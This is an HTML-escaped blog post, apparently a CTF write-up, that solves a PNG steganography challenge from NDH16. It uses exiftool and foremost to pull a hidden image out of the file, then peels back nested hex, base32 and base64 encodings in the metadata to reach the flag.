&lt;h2 id=&quot;challenge-description&quot;&gt;Challenge description&lt;/h2&gt;

&lt;p&gt;The PNG file &lt;a href=&quot;http://localhost:4000/assets/2018-07-05/OREILLES_SALES.png&quot;&gt;OREILLES_SALES.png&lt;/a&gt; (named after the famous french rapper “Orelsan”) is provided without more instructions.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-07-05/OREILLES_SALES.png&quot; alt=&quot;PNG preview&quot; title=&quot;PNG file preview&quot; width=&quot;40%&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;never-gonna-give-you-up&quot;&gt;Never gonna give you up&lt;/h2&gt;

&lt;p&gt;Since we’re never too careful when it comes to steganography, I verified that the provided file was indeed a PNG.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file OREILLES_SALES.png
OREILLES_SALES.png: PNG image data, 680 x 520, 8-bit/color RGBA, non-interlaced
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Even though this check isn’t infallible, we’ll suppose it tells the truth.&lt;/p&gt;

&lt;p&gt;Why don’t we start by checking metadata ? &lt;em&gt;*grabs exiftool*&lt;/em&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;exiftool OREILLES_SALES.png
ExifTool Version Number         : 11.03
File Name                       : OREILLES_SALES.png
Directory                       : &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
File Size                       : 396 kB
File Modification Date/Time     : 2018:07:01 00:11:07+02:00
File Access Date/Time           : 2018:07:05 22:34:23+02:00
File Inode Change Date/Time     : 2018:07:01 00:11:24+02:00
File Permissions                : rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 680
Image Height                    : 520
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Exif Byte Order                 : Little-endian &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Intel, II&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
User Comment                    : aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1kUXc0dzlXZ1hjUQ&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;
Thumbnail Offset                : 154
Thumbnail Length                : 5176
Gamma                           : 2.2222
White Point X                   : 0.3127
White Point Y                   : 0.329
Red X                           : 0.64
Red Y                           : 0.33
Green X                         : 0.3
Green Y                         : 0.6
Blue X                          : 0.15
Blue Y                          : 0.06
Background Color                : 255 255 255
Modify Date                     : 2017:09:22 11:41:16
Datecreate                      : 2017-09-22T13:41:16+02:00
Datemodify                      : 2017-09-22T13:41:16+02:00
Signature                       : f0140da3c2e1bf77c4183d771f341d8f3a8e3afc4c7c3b1b65917e8678b16b3e
Software                        : Adobe ImageReady
Warning                         : &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;minor] Trailer data after PNG IEND chunk
Image Size                      : 680x520
Megapixels                      : 0.354
Thumbnail Image                 : &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Binary data 5176 bytes, use &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; option to extract&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The &lt;strong&gt;User Comment&lt;/strong&gt; caught my attention, it was at this moment that I severely underestimated this challenge…&lt;/p&gt;

&lt;p&gt;Decoding this base64-encoded comment gives us the following URL:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1kUXc0dzlXZ1hjUQ==&quot;&lt;/span&gt; | base64 &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;
https://www.youtube.com/watch?v&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;dQw4w9WgXcQ
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I let you visit this link… Don’t worry, nothing dangerous. :sob:&lt;/p&gt;

&lt;h2 id=&quot;never-gonna-let-you-down&quot;&gt;Never gonna let you down&lt;/h2&gt;

&lt;p&gt;After this bitter failure, I decided to change my approach and to start looking for any dissimulated file inside the picture. To complete this task, I recommend the “&lt;strong&gt;Foremost&lt;/strong&gt;” tool, which is one of the best in its category.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;foremost OREILLES_SALES.png
Processing: OREILLES_SALES.png
|&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;|
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;The result of the extraction is stored in the “output” folder by default. Here, it gives two PNG files:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls &lt;/span&gt;output/png/
00000000.png  00000370.png
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;00000000.png&lt;/strong&gt; is the original picture provided with the challenge, but &lt;a href=&quot;http://localhost:4000/assets/2018-07-05/00000370.png&quot;&gt;00000370.png&lt;/a&gt; is way more interesting:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-07-05/00000370.png&quot; alt=&quot;00000370.png&quot; title=&quot;00000370.png preview&quot; width=&quot;40%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We will call this file “basiq.png” for more readability.&lt;/p&gt;

&lt;p&gt;Driven by my desire for revenge, I’ve had a look at metadata in this new file.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;exiftool basiq.png
ExifTool Version Number         : 11.03
File Name                       : basiq.png
Directory                       : &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
File Size                       : 210 kB
File Modification Date/Time     : 2018:07:01 00:16:42+02:00
File Access Date/Time           : 2018:07:05 23:12:37+02:00
File Inode Change Date/Time     : 2018:07:01 00:18:01+02:00
File Permissions                : rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 680
Image Height                    : 510
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Special Instructions            : 4D4A57564533324E4B524E474D5A4A544F5256553436544850424844455354494A555A4653364B5A474A4D5445544B584C453255344D5356474E475855514C5A4A555A4555334B5049524354435753584A4A5755365632474E5247573252544B4A56564655323232495247584F574C4E4A553245325243534E42484732534A524A5A4346534D433249354C47595453454E4D32453656324F4E4A4E4649554C324A564C565336434F4E4A4558515753584B4532553652434B4E564E4549554C594C4A57554B4E434E495241584F54544E4A553245365632534E4A4D5855524A544C4A4B464B36535A4B5249584F5432454C4A554655334B4B4E4A4D564F534C324C455A455532535049354954475454324A555A553256434B4E524846495A5A534A555A54434F493D
Gamma                           : 2.2222
White Point X                   : 0.31269
White Point Y                   : 0.32899
Red X                           : 0.63999
Red Y                           : 0.33001
Green X                         : 0.3
Green Y                         : 0.6
Blue X                          : 0.15
Blue Y                          : 0.05999
Background Color                : 255 255 255
Pixels Per Unit X               : 15748
Pixels Per Unit Y               : 15748
Pixel Units                     : meters
Modify Date                     : 2017:09:22 12:01:42
Datecreate                      : 2017-09-22T14:01:42+02:00
Datemodify                      : 2017-09-22T14:01:42+02:00
Signature                       : 5e6790047fb3e3c8a74d63cdf6e91766d0ba9f513f8d5ea2020e51514bc3ee05
Image Size                      : 680x510
Megapixels                      : 0.347
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And once again, a special field caught my attention. Guess which one…&lt;/p&gt;

&lt;p&gt;Well, let’s give it a second chance, knowing that the Rick Roll threat was hanging over me.&lt;/p&gt;

&lt;p&gt;The message surely is encoded, but how ? We will figure this out by trying all of the potential encoding:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Base64 gave nothing relevant.&lt;/li&gt;
  &lt;li&gt;Can’t be Base32 because of invalid characters such as “0” and “1”.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Base16&lt;/strong&gt;? The most likely possibility. Python will help us verify it.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;boiteaklou&lt;/span&gt;&lt;span class=&quot;nd&quot;&gt;@kali&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;python&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Python&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;2.7&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;14&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Apr&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2018&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;04&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;25&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GCC&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;7.3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;on&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;linux2&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Type&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;help&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;copyright&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;credits&quot;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;license&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;more&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;information&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;4D4A5756[...]4F493D&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hex&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;'MJWVE32NKRNGMZJTORVU46THPBHDESTIJUZFS6KZGJMTETKXLE2U4MSVGNGXUQLZJUZEU3KPIRCTCWSXJJWU6V2GNRGW2RTKJVVFU222IRGXOWLNJU2E2RCSNBHG2SJRJZCFSMC2I5LGYTSENM2E6V2ONJNFIUL2JVLVS6CONJEXQWSXKE2U6RCKNVNEIULYLJWUKNCNIRAXOTTNJU2E6V2SNJMXURJTLJKFK6SZKRIXOT2ELJUFU3KKNJMVOSL2LEZEU2SPI5ITGTT2JUZU2VCKNRHFIZZSJUZTCOI='&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Great! We have another base-encoded message! I’ll skip the determination process for this one, we’re dealing with &lt;strong&gt;base32&lt;/strong&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;MJWVE32NKR[...]ZSJUZTCOI=&quot;&lt;/span&gt; | base32 &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;
bmRoMTZfe3tkNzgxN2JhM2YyY2Y2MWY5N2U3MzAyM2JmODE1ZWJmOWFlMmFjMjZkZDMwYmM4MDRhNmI1NDY0ZGVlNDk4OWNjZTQzMWYxNjIxZWQ5ODJmZDQxZmE4MDAwNmM4OWRjYzE3ZTUzYTQwODZhZmJjYWIzY2JjOGQ3NzM3MTJlNTg2M319
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;One more! Let me guess, &lt;strong&gt;base64&lt;/strong&gt; this time?&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;bmRoMTZf[...]NTg2M319&quot;&lt;/span&gt; | base64 &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;
ndh16_&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;d7817ba3f2cf61f97e73023bf815ebf9ae2ac26dd30bc804a6b5464dee4989cce431f1621ed982fd41fa80006c89dcc17e53a4086afbcab3cbc8d773712e5863&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Alright, this was the final step! Congratz’ :triangular_flag_on_post:&lt;/p&gt;

&lt;p id=&quot;signature&quot;&gt;BoiteAKlou :hammer:&lt;/p&gt;</content><author><name>BoiteAKlou</name></author><summary type="html">A steganographic challenge showing the essential tools for PNG analysis and manipulating encoding bases.</summary></entry></feed>